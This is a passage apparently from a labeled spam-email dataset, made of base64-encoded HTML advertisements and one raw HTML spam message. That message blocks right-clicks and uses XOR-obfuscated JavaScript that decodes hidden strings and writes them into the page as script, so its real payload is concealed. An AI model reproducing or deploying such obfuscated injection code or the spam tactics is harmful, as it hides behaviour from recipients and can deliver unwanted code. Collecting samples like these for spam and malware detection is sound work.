bzpwPjwvc3Bhbj48L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBhbGlnbj1jZW50ZXIgc3R5 bGU9J3RleHQtYWxpZ246Y2VudGVyJz48c3Bhbg0Kc3R5bGU9J2NvbG9yOmJsdWUnPlRoaXMg b2ZmZXIgZW5kcyBKdWx5LjxvOnA+PC9vOnA+PC9zcGFuPjwvcD4NCg0KPHAgY2xhc3M9TXNv Tm9ybWFsIGFsaWduPWNlbnRlciBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXInPjxzcGFuDQpz dHlsZT0nY29sb3I6Ymx1ZSc+PCFbaWYgIXN1cHBvcnRFbXB0eVBhcmFzXT4mbmJzcDs8IVtl bmRpZl0+PG86cD48L286cD48L3NwYW4+PC9wPg0KDQo8cCBjbGFzcz1Nc29Ob3JtYWwgYWxp Z249Y2VudGVyIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcic+PHNwYW4NCnN0eWxlPSdjb2xv cjpibHVlJz5WaXNpdCBvdXIgc2l0ZSBub3cgc2VlIHdoYXQgd2UgY2FuIG9mZmVyIHlvdS48 bzpwPjwvbzpwPjwvc3Bhbj48L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBhbGlnbj1jZW50 ZXIgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyJz48c3Bhbg0Kc3R5bGU9J2NvbG9yOmJsdWUn PjwhW2lmICFzdXBwb3J0RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9vOnA+ PC9zcGFuPjwvcD4NCg0KPHAgY2xhc3M9TXNvTm9ybWFsIGFsaWduPWNlbnRlciBzdHlsZT0n dGV4dC1hbGlnbjpjZW50ZXInPjxzcGFuDQpzdHlsZT0nZm9udC1zaXplOjIwLjBwdDttc28t YmlkaS1mb250LXNpemU6MTIuMHB0O2NvbG9yOnJlZCc+PGENCmhyZWY9Imh0dHA6Ly93d3cu YnVzaW5lc3NtYWlsbGlzdC5jb20vIj48c3BhbiBzdHlsZT0nY29sb3I6cmVkJz5odHRwOi8v d3d3LmJ1c2luZXNzbWFpbGxpc3QuY29tLzwvc3Bhbj48L2E+DQo8bzpwPjwvbzpwPjwvc3Bh bj48L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBhbGlnbj1jZW50ZXIgc3R5bGU9J3RleHQt YWxpZ246Y2VudGVyJz48c3Bhbg0Kc3R5bGU9J2NvbG9yOmJsdWUnPjwhW2lmICFzdXBwb3J0 RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9vOnA+PC9zcGFuPjwvcD4NCg0K PHAgY2xhc3M9TXNvTm9ybWFsIHN0eWxlPSd0ZXh0LWFsaWduOmp1c3RpZnknPioqKioqKioq KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqPHNwYW4NCnN0eWxlPSdmb250LXNp emU6MTAuMHB0O2ZvbnQtZmFtaWx5OkFyaWFsO21zby1iaWRpLWZvbnQtZmFtaWx5OiJUaW1l cyBOZXcgUm9tYW4iOw0KbGV0dGVyLXNwYWNpbmc6LS4yNXB0Jz48bzpwPjwvbzpwPjwvc3Bh bj48L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBzdHlsZT0ndGV4dC1hbGlnbjpqdXN0aWZ5 Jz5UaGlzIGUtbWFpbCBpcyBzZW50IHRvIHlvdSBpbg0KY29tcGxpYW5jZSB3aXRoIHN0cmlj dCBhbnRpLWFidXNlIGFuZCBubyBzcGFtIHJlZ3VsYXRpb25zLCBhbmQgaGFzIGEgcmVtb3Zl DQptZWNoYW5pc20gYnVpbHQgaW4gZm9yIHJlbW92aW5nIHlvdXJzZWxmIGZyb20gb3VyIG1h aWxpbmcgZGF0YSBiYXNlLiBZb3VyDQplLW1haWwgd2FzIG9idGFpbmVkIGFzIGEgcmVzdWx0 IG9mIHBvc3RpbmcgdG8gbGlua3MsIGNsYXNzaWZpZWQgYWR2ZXJ0cywgb3B0LWluDQptYWls aW5nIGxpc3RzIG9yIHlvdSBoYXZlIGUtbWFpbGVkIHVzIGluIHRoZSBwYXN0LlRvIHJlbW92 ZSB5b3VyIGUtbWFpbCBzaW1wbHkNCnJlcGx5IHdpdGggPGEgaHJlZj0ibWFpbHRvOnN5c3Rl bXhAdXR2aW50ZXJuZXQuY29tP3N1YmplY3Q9cmVtb3ZlIj5yZW1vdmU8L2E+DQppbiB0aGUg c3ViamVjdCBsaW5lLjxzcGFuIHN0eWxlPSJtc28tc3BhY2VydW46DQp5ZXMiPqCgoKCgoKCg oKCgoKCgoKCgoKCgoKCgoKCgoKCgoKANCjwvc3Bhbj4qKioqKioqKioqKioqKioqKioqKioq KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq KioqKioqKioqKioqKioqKio8L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBhbGlnbj1jZW50 ZXIgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyJz48c3Bhbg0Kc3R5bGU9J2NvbG9yOmJsdWUn PjwhW2lmICFzdXBwb3J0RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9vOnA+ PC9zcGFuPjwvcD4NCg0KPHAgY2xhc3M9TXNvTm9ybWFsIGFsaWduPWNlbnRlciBzdHlsZT0n dGV4dC1hbGlnbjpjZW50ZXInPjxzcGFuDQpzdHlsZT0nY29sb3I6cmVkJz48IVtpZiAhc3Vw cG9ydEVtcHR5UGFyYXNdPiZuYnNwOzwhW2VuZGlmXT48bzpwPjwvbzpwPjwvc3Bhbj48L3A+ DQoNCjwvZGl2Pg0KDQo8L2JvZHk+DQoNCjwvaHRtbD4NCiAgICA=,
1,"<HTML> <BODY> <!-- saved from url=3D(0022)http://internet.e-mail --> <head> <SCRIPT language=3DJavaScript1.2> if (window.Event) // Only Netscape will have the CAPITAL E. document.captureEvents(Event.MOUSEUP); // catch the mouse up event function nocontextmenu() // this function only applies to IE4, ignored ot= herwise. { event.cancelBubble =3D true; event.returnValue =3D false; return false; } function norightclick(e) // This function is used by all others { if (window.Event) // again, IE or NAV? { if (e.which =3D=3D 2 || e.which =3D=3D 3) return false; } else if (event.button =3D=3D 2 || event.button =3D=3D 3) { event.cancelBubble =3D true event.returnValue =3D false; return false; } } document.oncontextmenu =3D nocontextmenu; // for IE5+ document.onmousedown =3D norightclick; // for all others </SCRIPT> <SCRIPT> var char_escaped=3D""%FF%FE%FD%FC%FB%FA%F9%F8%F7%F6%F5%F4%F3%F2%F1%F0%EF%EE= %ED%EC%EB%EA%E9%E8%E7%E6%E5%E4%E3%E2%E1%E0%DF%DE%DD%DC%DB%DA%D9%D8%D7%D6%D= 5%D4%D3%D2%D1%D0%CF%CE%CD%CC%CB%CA%C9%C8%C7%C6%C5%C4%C3%C2%C1%C0%BF%BE%BD%= BC%BB%BA%B9%B8%B7%B6%B5%B4%B3%B2%B1%B0%AF%AE%AD%AC%AB%AA%A9%A8%A7%A6%A5%A4= %A3%A2%A1%A0%9F%9E%9D%9C%9B%9A%99%98%97%96%95%94%93%92%91%90%8F%8E%8D%8C%8= B%8A%89%88%87%86%85%84%83%82%81%80%7F%7E%7D%7C%7B%7A%79%78%77%76%75%74%73%= 72%71%70%6F%6E%6D%6C%6B%6A%69%68%67%66%65%64%63%62%61%60%5F%5E%5D%5C%5B%5A= %59%58%57%56%55%54%53%52%51%50%4F%4E%4D%4C%4B%4A%49%48%47%46%45%44%43%42%4= 1%40%3F%3E%3D%3C%3B%3A%39%38%37%36%35%34%33%32%31%30%2F%2E%2D%2C%2B%2A%29%= 28%27%26%25%24%23%22%21%20%1F%1E%1D%1C%1B%1A%19%18%17%16%15%14%13%12%11%10= %0F%0E%0D%0C%0B%0A%09%08%07%06%05%04%03%02%01%00""; var char_all =3D unescape( char_escaped ); function bound( min_val, value, max_val ) { if( value < min_val ) { value =3D min_val; } if( value > max_val ) { value =3D max_val; } return value; } function aton( string, index ) { index =3D bound( 0, index, string.length-1 ); return char_all.indexOf( string.charAt( index ), 0 ); } function ntoa( index ) { // Convert a number to a character. The range is 0x00 to 0xFF inclusiv= e. // Revision 1.00, becd. index =3D bound( 0, index, 0xFF ); return char_all.charAt( index ); } function xor( data, pattern ) { var ii =3D 0; var jj =3D 0; var result =3D """"; if( pattern =3D=3D = null || pattern =3D=3D """" || pattern.length <=3D 0 ) { pattern =3D ""= simple_xor_pattern""; } for( ii =3D 0; ii < data.length; ii++ ) { if( jj >=3D pattern.length ) { jj =3D 0; } result +=3D ntoa( aton( data, ii ) ^ aton( pattern, jj++ )); } return result; } function dede( data, pattern ) { return xor( unescape( data ), pattern = ); } // --> </SCRIPT> <SCRIPT> function go() { var tt=3D""""; tt=3Ddede('%AA%B8%A9%A5%BA%A4%A1%A3%EC%AA%A8%A1%A1%E5%E7%ED%B7%ED%B0%AF%A0= %A9%A1%BA%E2%A2%B7%A3%A0%E5%E9%A5%B8%B9%B7%FC%E1%E2%FF%F4%F4%E3%F2%E8%FF%F= 9%FD%E3%FE%FE%F5%E1%E2%ED%E9%9E%AD%A0%B7%AA%AB%EA%E2%ED%EB%B9%A8%A9%A2%AF%= AF%BF%F1%A3%A8%EA%A2%A2%AD%AC%B8%A4%A8%A8%F3%A3%A1%E1%A8%A4%B5%A3%AD%B9%A1= %BF%A5%A8%B4%FB%A0%A2%E2%BE%B8%AC%B3%B3%BD%F0%A0%A2%E0%A0%A2%A8%BB%AF%AF%B= F%F1%A3%A8%EA%BD%AE%BC%A2%A0%A1%A5%A7%BC%BE%F3%B4%A9%BE%EB%B4%AB%BE%A7%B7%= AD%AF%AB%A3%F3%A3%A1%E1%AF%A2%B7%BF%A6%A4%BD%B9%A3%BF%BE%FB%A0%A2%E2%AB%B9= %A1%AB%B5%AD%BF%AB%A8%A2%EA%EE%FD%B3','32891212'); document.write(""<script>""); document.write(tt); document.write('<'); document.write('\u002F'); document.write('script'); document.write('>'); tt=3Ddede('%F0%9F%89%8E%84%8F%EC%BC%A1%A8%BC%A2%F1%FC%FD%E9%E8%AB%A0%A2%AF= %A2%F5%A9%A9%A5%BC%A9%BA%EA%AE%A4%BA%A8%AD%B8%F1%FB%F6%F0%9C%88%83%8F%91%F= 2%F4%9E%9E%F5%F4%98%8C%F4%F0%8F%81%9A%E8%AB%A0%A2%AF%A2%F5%A9%A9%A5%BC%A9%= BA%F4%F0%89%F6%F0%8E%85%82%9F%E8%AA%A9%A9%A9%F6%89%BE%A1%AB%A0%EB%AB%A3%A4= %A5%BE%F6%EB%F4%F8%FA%FC%F3%F8%EC%BB%A3%B6%AE%F5%F9%F6%82%8D%99%8C%8F%87%9= 8%89%EB%9B%89%90%EA%9B%8E%8D%87%84%B3%F0%E4%8E%83%86%9E%F2%F7%E7%8E%F6%EA%= F0%E4%8C%85%9E%F4%F0%E4%9C%88%F6%F6%E3%9F%9A%F2%F4%E5%98%89%87%88%91%F4%F0= %E4%9C%8D%8A%86%89%F5','347375'); document.write(tt); tt=3Ddede('%F0%9F%89%8E%84%8F%EC%A8%AD%A0%A4%99%BC%AA%AB%A5%A6%AD%F1%FB%E8= %AF%AD%A6%A0%9B%A9%A8%AC%A3%A2%AC%F5%FD%E8%BD%A5%AF%BC%A4%F5%F9%FB%FB%E8%A= D%A4%A3%AB%A5%F5%AF%AD%A4%B8%AE%BA%EC%AA%A5%BE%AF%AD%BE%F5%FA%F2%F7%9C%8E%= 87%8E%95%F5%F4%98%9A%F4%F0%9F%8C%EC%BF%A3%A8%BF%A0%F1%F9%FA%FC%EE%E8%AE%AF= %89%A3%A7%A7%BE%F5%A8%A0%AA%AB%A7%F6%F6%98%8A%8A%80%8D%EA%AF%AE%A4%A0%9B%B= A%AD%A8%A1%A2%AF%F7%FC%EB%AB%A9%A4%A6%9C%AA%AC%A8%A1%A4%AB%F6%FD%EC%BF%A3%= A8%BF%A0%F1%EA%FB%FC%FB%ED%EE%E8%A8%A3%B9%AC%A9%BA%F7%FC%F5%F4%98%8A%85%88= %92%F6%F0%9C%98%F2','347375'); document.write(tt); tt=3Ddede('%F0%9F%8C%EC%BE%8B%A0%A2%AF%A2%F5%BE%A3%BB%E8%AD%A4%A3%AB%A5%F5= %A0%AD%AC%B8%EB%BF%A5%AC%BE%A4%F6%EA%FD%F8%FA%E9%E9%E8%AE%AF%89%A3%A7%A7%B= E%F5%E9%AF%A8%AB%AF%AE%AC%F2%F7%98%EC%A9%A6%A5%AC%A6%F1%AB%AF%A2%BF%AD%BE%= F6%F6%8F%8E%86%98%8D%98%F2%F7%8E%83%86%9E%EC%AD%A9%AF%AD%F7%AD%B9%A1%AD%A4= %EA%BF%A2%B2%A9%F5%F8%F2%F7%8A%F2%A4%A3%BA%AE%E8%AA%AD%AF%A8%B8%E8%AA%BA%A= 5%A1%EB%BF%A9%AA%A9%AD%A6%BB%EC%A9%BE%EC%A3%A7%A1%AD%F6%E3%89%F6%E2%E8%82%= AD%B9%AC%AF%A7%B8%A9%B8%AD%B4%E8%A3%BF%EB%BC%A4%AD%EA%AE%A2%AF%AB%AD%B9%B8= %EB%AD%BE%A7%BE%A5%A8%E8%BB%AD%A8%AF%AA%A5%EC%AB%A5%A1%A6%BD%A2%A1%BE%B5%E= B%A1%A2%E8%BE%A4%AE%E8%BB%A7%B8%A0%AF%E9','347375'); document.write(tt); tt=3Ddede('%8F%BE%A5%EC%BB%AF%A9%EB%AF%A5%BA%A6%BF%EB%AE%BE%A7%A7%EC%AA%A4= %A0%E8%A5%BA%AE%BA%EC%BC%A2%A9%EB%BF%A3%BA%A6%A8%E5%E8%F0%8A%F4%81%8A%83%8= 9%E8%B3%83%9E%9A%EC%8C%98%89%8A%85%9F%E8%88%89%88%87%81%8D%EA%9E%8E%89%80%= 81%9E%B5%E5%E6%E2%E6%E4%EC%87%81%9A%8D%EB%F0%E4%8A%F2%E8%AF%BA%AE%BA%B5%E8= %AE%AD%B2%E8%BB%AD%EA%A4%AA%BE%A9%E8%A4%A9%BC%E8%BF%AD%A4%A8%AE%BA%BF%E8%A= 5%A2%A7%A1%A2%AD%EA%E2%E5%E6%AF%BD%A7%EC%A2%A6%B8%A7%EA%B8%A3%AD%EC%BF%A5%= BE%A7%AC%EC%A7%AC%EC%F7%8A%F2%84%83%9A%8E%E8%89%9A%85%98%82%8B%ED%E9%EB%ED= %F7%8A%9E%F6%F6%E3%89%F6%F0%E7%8C%83%85%9C%F2%F4%E5%8F%8E%86%98%8D%98%F2%F= 7%98%EC%A9%A6%A5%AC%A6%F1%AB%AF%A2%BF%AD%BE%F6%F6%8E%99%F6','347375'); document.write(tt); tt=3Ddede('%F0%8D%87%82%9C%EA%AA%AA%AB%A9%F5%E8%9A%AE%BA%A8%A9%A4%AD%E7%E8= %8D%BA%A3%AD%A7%E4%EC%80%AF%A0%BD%AD%B8%A1%A9%AD%E7%E8%BF%A9%A4%BF%E6%BB%A= 9%BA%A3%AA%E9%E8%BF%A1%B0%A9%F6%FC%F2%F4%88%F2%F9%FC%E3%FF%EA%8A%99%8D%89%= E8%99%89%93%E8%9F%80%85%9B%EA%F4%E3%8A%F4%F0%E4%8E%83%86%9E%F2%F7%8A%9E%F6= %F6%98%8A%8A%80%8D%EA%AF%AE%A4%A0%9B%BA%AD%A8%A1%A2%AF%F7%FC%EB%AB%A9%A4%A= 6%9C%AA%AC%A8%A1%A4%AB%F6%FD%EC%BF%A3%A8%BF%A0%F1%EA%FB%FC%FB%ED%EE%E8%A8%= A3%B9%AC%A9%BA%F7%FC%F5%F4%98%8A%85%88%92%F6%F0%9C%98%F2%F7%9C%88%E8%AB%A0= %A2%AF%A2%F5%A7%A5%AF%AC%A0%AD%F4%F0%82%85%8B%E8%A2%A9%A2%AF%A4%BC%F7%F9%F= D%E8%AD%A4%BE%F1%E9%EA%EC%BB%B8%AF%F6%EA%A4%BC%BE%BC%F1%E7%E3%BF%BD%BB%E5%= A4%A3%A4%A3%B8%AA%A4%E2%AB%A5%A1%E4%A1%A1%A9%AD%A9%B8%E7%AA%BB%A1%FD%FD%E6= %A6%B8%AD%EE','347375'); document.write(tt); tt=3Ddede('%EC%BC%A1%A8%BC%A2%F1%FC%F0%EC%AA%A5%BE%AF%AD%BE%F5%FB%F2%F7%89= %EC%A0%B8%A9%AD%F5%EE%A0%BE%B8%BB%F2%E3%E7%BD%BB%BC%E6%BA%A1%B9%A5%BF%E5%B= 4%E6%A4%A9%BF%E7%EE%F6%F6%ED%E6%E5%F0%AA%B8%F2%F7%AE%A3%A6%BE%EC%AD%A9%AF%= AD%F7%AD%B9%A1%AD%A4%EA%BF%A2%B2%A9%F5%E7%FE%F5%9C%A9%AD%A4%BF%F7%E7%AD%F6= %E7%E1%F5%F4%E3%89%F4%F0%E4%9C%88%F6%F6%98%8F%E8%AD%A4%A3%AB%A5%F5%A1%A1%A= E%A8%A7%AD%F2%F4%83%81%8C%E8%A4%AD%A3%AB%A3%BC%F1%FD%FC%EC%AA%A4%B8%F5%E8%= EE%EB%BB%BE%AB%F7%EE%A3%BC%B8%B8%F0%E3%E4%BF%BB%BF%E4%A0%A4%A4%A5%BC%AB%A0= %E5%AB%A3%A5%E5%A5%A6%A9%AB%AD%B9%E3%AD%BB%A7%F9%FF%E2%A1%B8%AB%EA%EA%BB%A= 2%AC%B8%A0%F7%FB%F3%E8%AE%A7%B8%A8%AE%BA%F1%F9%F4%F0%8A%E8%A4%BA%AF%AA%F6%= EA%A4%BC%BE%BC%F1%E7%E3%BF%BD%BB%E5%BE%A5%BB%A3%B8%E6%B0%E2%A6%AF%B8%E4%EA= %F2%F4%EB%E1%E6%F4%AE%BA%F4','347375'); document.write(tt); tt=3Ddede('%F0%AD%A7%A2%BC%EA%AA%AA%AB%A9%F5%AB%BE%A2%A9%A0%E8%B9%A5%B1%AD= %F1%E5%F8%F2%88%BD%A1%BB%A2%A3%BF%BB%F0%E7%AB%F2%E6%E5%F2%F4%E5%8D%F5%F4%E= 3%9C%8E%F2%F7%9C%88%E8%AB%A0%A2%AF%A2%F5%A7%A5%AF%AC%A0%AD%F4%F0%82%85%8B%= E8%A2%A9%A2%AF%A4%BC%F7%F9%FD%E8%AD%A4%BE%F1%E9%EA%EC%BB%B8%AF%F6%EA%A4%BC= %BE%BC%F1%E7%E3%BF%BD%BB%E5%A4%A3%A4%A3%B8%AA%A4%E2%AB%A5%A1%E4%A1%A1%A9%A= D%A9%B8%E7%AA%BB%A1%FD%F2%E6%A6%B8%AD%EE%EB%BF%A5%AC%BE%A4%F6%FF%F4%E8%A8%= A3%B9%AC%A9%BA%F7%FD%F5%F4%8D%E8%A2%BE%AE%AE%F1%EA%A2%B8%BF%B8%F6%E7%E5%BB= %BC%BF%E2%BE%A3%BF%A2%BC%E1%B0%E4%A2%AE%BC%E3%EA%F4%F0%EA%E5%E1%F4%A8%BE%F= 5%F4%AA%A7%A4%B8%EB%AE%AD%AB%AF%F1%AA%BA%A5%A9%A6%EC%B8%A1%B6%AD%F7%E1%F9%= F6%8E%A1%AD%8E%A4%A7%AE%BB%F6%E3%AA%F6%E1%E5%F4%F0%E4%89%F2%F4%E5%98%8F%F6= %F0%E7%9E%9E%F5%F4%E3%9C%88%83%8F%91%F2%F4%E5%98%8A%8A%80%8D%F4','347375')= ; document.write(tt); tt=3Ddede('%F0%9F%89%8E%84%8F%EC%BC%A1%A8%BC%A2%F1%E9%FF%F9%ED%E8%EC%AA%A4= %A5%AF%A4%F1%A8%AD%A2%BC%AF%BE%EB%AA%A3%BA%AE%A9%B9%F5%FC%F6%F6%98%89%87%8= 8%91%F4%F0%9F%9A%F2%F4%9E%88%F5%F4%8A%87%98%81%F5%F4%85%86%9A%99%9F%E8%A3%= A6%A9%A0%A2%AB%A7%F5%E8%AB%A4%AF%A3%E0%E3%F7%E9%E8%B8%B1%BA%A9%F6%AA%B9%BC= %BE%A3%A5%E8%BA%A9%A6%B9%AE%F5%EE%8B%A6%A5%A8%A3%EC%A0%AF%BE%AE%E8%B8%A7%E= A%AD%A8%AB%A9%BB%B9%EC%A4%BD%BE%E8%B9%A5%BF%AD%EE%E8%A4%AD%A6%AD%F1%8A%9F%= 98%9F%87%82%E8%A5%A2%A7%A1%AF%A3%F7%EE%AC%A7%E4%E1%E8%F2%EB%F4%E3%8E%85%9E= %86%F6%F0%E7%9E%88%F5%F4%E3%9C%98%F2%F7%E7%98%8A%85%88%92%F6%F0%E7%9E%8D%8= 9%84%89%F6%F6%88%82%9E%EC%A9%A6%A5%AC%A6%F1%AB%AF%A2%BF%AD%BE%F6%F6%8E%99%= F6%F0%E7%8E%85%9D%F6%F0%E7%9E%88%F5%F4%E3%9C%98%F2%F7%E7%98%8A%85%88%92%F6= %F0%E7%9E%8D%89%84%89%F6%F6%E3%9F%8C%F2%F4%E5%98%99%F6%F0%E7%9E%8E%84%8C%9= 5%F6%F6%E3%9F%89%8E%84%8F%F2','347375'); document.write(tt); } // --> </SCRIPT> </head> <body > <script> go(); </script> </body> </BODY></HTML>",
1,PGh0bWw+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29u dGVudD0iemgtdHciPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0 ZXh0L2h0bWw7IGNoYXJzZXQ9YmlnNSI+DQo8bWV0YSBuYW1lPSJHRU5FUkFUT1IiIGNvbnRlbnQ9 Ik1pY3Jvc29mdCBGcm9udFBhZ2UgNC4wIj4NCjxtZXRhIG5hbWU9IlByb2dJZCIgY29udGVudD0i RnJvbnRQYWdlLkVkaXRvci5Eb2N1bWVudCI+DQo8dGl0bGU+wLC5TLNcpmikSKRds1ynQaW/u92t bjwvdGl0bGU+DQo8L2hlYWQ+DQoNCjxib2R5IGJnY29sb3I9IiNGRjk5MDAiIGJhY2tncm91bmQ9 ImNpZDouLi9VU0VSL0hPTUVQQUdFL1dHSUYvQkcwMy5HSUYiPg0KDQo8cCBzdHlsZT0ibWFyZ2lu LXRvcDogMDsgbWFyZ2luLWJvdHRvbTogMCI+PGZvbnQgY29sb3I9IiMwMDAwRkYiPrNvrE+pZbBV pdGxTbd+vHOnaaS9pXGlTrVvpMWqvbG1pl6rSLVMqmuxtaasICAgICANCsvnIH4gITwvZm9udD48 L3A+ICAgIA0KDQo8aHIgc2l6ZT0iMSI+DQo8ZGl2IGFsaWduPSJjZW50ZXIiPg0KICA8Y2VudGVy Pg0KICA8dGFibGUgYm9yZGVyPSIwIiB3aWR0aD0iNjA2IiBoZWlnaHQ9IjM2NSIgY2VsbHNwYWNp bmc9IjAiIGNlbGxwYWRkaW5nPSIwIiBzdHlsZT0iYm9yZGVyOiAyIGRvdHRlZCAjRkY5OTMzIj4N CiAgICA8dHI+DQogICAgICA8dGQgd2lkdGg9IjYwMCIgaGVpZ2h0PSIzNjUiIHZhbGlnbj0ibWlk ZGxlIiBhbGlnbj0iY2VudGVyIiBiZ2NvbG9yPSIjMDBDQzAwIj4NCiAgICAgICAgPHAgYWxpZ249 ImxlZnQiPjxmb250IGNvbG9yPSIjMDAwMGZmIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsgICANCiAgICAgICAgr9S7fqdBtFis7cTBoUHBQbjRpECt0773t3yhSaFJPC9mb250 PjwvcD4NCiAgICAgICAgPHAgYWxpZ249ImxlZnQiPjxmb250IGNvbG9yPSIjMDAwMGZmIj4mbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgICANCiAgICAgICAgsnuktarA t3ykaq5hs6OmYqfkvve3fKFBpv2+97d8qNOuyadBr3WquqzdqOykRrbcJm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PC9mb250PjwvcD4NCiAgICAgICAgPHAgYWxpZ249ImxlZnQi Pjxmb250IGNvbG9yPSIjMDAwMGZmIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgICANCiAgICAg ICAgpFWkQK3Tpb+9VKq6qE2pdzwvZm9udD48YSBocmVmPSJodHRwOi8va2trLmg4aC5jb20udHci Pjxmb250IGNvbG9yPSIjZmYwMDAwIj7CSaRVpUw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDAwZmYi PqdhPC9mb250PjwvYT48Zm9udCBjb2xvcj0iIzAwMDBmZiI+oUmhSTwvZm9udD48L3A+DQogICAg ICAgIDxwIGFsaWduPSJsZWZ0Ij48Zm9udCBjb2xvcj0iI2ZmZmZmZiI+Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 ICAgDQogICAgICAgIKRdvdCxeqtPr2SmuavKRS1tYWlsJm5ic3A7Jm5ic3A7PC9mb250PjwvcD4N CiAgICAgICAgPHByZT48Zm9udCBzaXplPSIzIj6kXb3QsXqrT69kprmrykUtbWFpbDwvZm9udD48 L3ByZT4NCiAgICAgICAgPHByZT48Zm9udCBzaXplPSIzIj4gICAgvdCxerDIpbKs3ae5prk8YSBo cmVmPSJodHRwOi8va2trLmg4aC5jb20udHciPr73t3y8dqT5PC9hPqvhpkGnUrCjPC9mb250Pjwv cHJlPg0KICAgICAgICA8cD6hQDwvcD4NCiAgICAgICAgPHAgYWxpZ249ImxlZnQiPjxmb250IGNv bG9yPSIjMDAwMGZmIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgICAN CiAgICAgICAgs8yr4a+ssXqhRzwvZm9udD48L3A+DQogICAgICAgIDxwIGFsaWduPSJsZWZ0Ij48 Zm9udCBjb2xvcj0iIzAwMDBmZiI+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7 Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7ICAgDQogICAgICAg IKTft1GoxqaoJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7ILhVqMamcLdOPC9m b250PjwvcD4gIA0KICAgICAgICA8cD6hQDwvdGQ+DQogICAgPC90cj4NCiAgPC90YWJsZT4NCiAg PC9jZW50ZXI+DQo8L2Rpdj4NCjxociBzaXplPSIxIj4NCjxwIGFsaWduPSJjZW50ZXIiIHN0eWxl PSJtYXJnaW4tdG9wOiAwOyBtYXJnaW4tYm90dG9tOiAwIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+ 